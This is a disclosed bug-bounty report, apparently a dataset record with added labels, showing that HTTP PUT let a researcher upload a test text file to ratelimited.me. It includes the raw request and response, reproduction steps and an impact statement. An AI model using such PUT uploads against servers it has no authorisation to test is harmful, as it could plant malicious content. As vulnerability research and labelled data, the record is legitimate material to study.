{
    "reported_to": "RATELIMITED",
    "reported_by": "codeslayer1337 ",
    "title": "HTTP PUT method is enabled ratelimited.me",
    "content": "\nFound on HTTP PUT sites enabled on web servers. I tried testing to write the file / codelayer137.txt uploaded to the server using the PUT verb, and the contents of the file were then taken using the GET verb. the following is POC\nRequest:\nPUT /codeslayer137.txt HTTP/1.1\nHost: ratelimited.me\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\nAccept-Language: id,en-US;q=0.7,en;q=0.3\nConnection: close\nCookie: __cfduid=dfa5166b2ed63c2a5078df85a46ec5e941548497323; fs_uid=rs.fullstory.comHCE075768820354449408:5743114304094208; cookieconsent_status=dismiss; mp_9e50b60442d3361880f79100f15e5aac_mixpanel=%7B%22distinct_id%22%3A%20%2216889a21237498-0766105008d6a5-12666d4a-e1000-16889a212387c%22%2C%22%24device_id%22%3A%20%2216889a21237498-0766105008d6a5-12666d4a-e1000-16889a212387c%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Sun, 27 Jan 2019 00:07:53 GMT\nContent-Length: 21\nTesting CodeSlayer137\nResponse:\nHTTP/1.1 200 OK\nDate: Tue, 29 Jan 2019 08:24:15 GMT\nContent-Type: text/plain\nContent-Length: 0\nConnection: close\nAccept-Ranges: bytes\nContent-Security-Policy: block-all-mixed-content\nEtag: \"be3b22647a7d52f2f662109652e629fc\"\nVary: Origin\nX-Amz-Request-Id: 157E4426C0B3D211\nX-Minio-Deployment-Id: ebc7a0d8-9f47-4bdb-92ee-4a9cbbd3ec48\nX-Xss-Protection: 1; mode=block\nExpect-CT: max-age=604800, report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"\nServer: cloudflare\nCF-RAY: 4a0a4d20791f31a4-SIN\nImpact\nThe HTTP PUT method is normally used to upload data that is saved on the server at a user-supplied URL. If enabled, an attacker may be able to place arbitrary, and potentially malicious, content into the application. Depending on the server's configuration, this may lead to compromise of other users (by uploading client-executable scripts), compromise of the server (by uploading server-executable code), or other attacks.\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": null,
    "weaknesses": [
        "None"
    ],
    "screenshots": {},
    "disclosed_date": 1548796140,
    "report_url": "https://hackerone.com/reports/487656",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "API",
    "steps": [
        [
            1,
            "Send a PUT request to the target server with a file path and content, e.g., PUT /codeslayer137.txt HTTP/1.1 with the body 'Testing CodeSlayer137'."
        ],
        [
            2,
            "Verify the file was uploaded by sending a GET request to the same path, e.g., GET /codeslayer137.txt HTTP/1.1."
        ]
    ],
    "vuln_description": "The HTTP PUT method is enabled on the server, allowing arbitrary file uploads. An attacker can upload malicious files to the server, potentially leading to server compromise or client-side attacks.",
    "reason": "The vulnerability involves a straightforward exploitation of an enabled HTTP method (PUT) to upload files. No complex interactions or state manipulations are required, and the logic is commonly understood in web security contexts.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}